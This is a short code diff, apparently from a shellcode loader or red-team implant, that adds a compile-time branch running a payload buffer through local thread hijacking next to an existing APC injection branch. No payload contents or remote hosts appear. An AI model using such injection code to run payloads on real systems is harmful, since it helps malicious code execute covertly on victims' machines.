@@ -66,6 +66,16 @@ int main() {
     }
     #endif // !LOCAL_THREAD_HIJACK
 
+    #ifdef LOCAL_THREAD_HIJACK_ENUM
+    if ( ! LocalThreadHijack( pbPayload, sizeof( Payload ) ) ) {
+        #ifdef DEBUG
+        printf( "[-] Failed to Execute Payload\n");
+        #endif // !DEBUG
+        
+        return 1;
+    }
+    #endif // !LOCAL_THREAD_HIJACK_ENUM
+
     #ifdef APC
     if ( ! ApcInjection( pbPayload, sizeof( Payload ) ) ) {
         #ifdef DEBUG
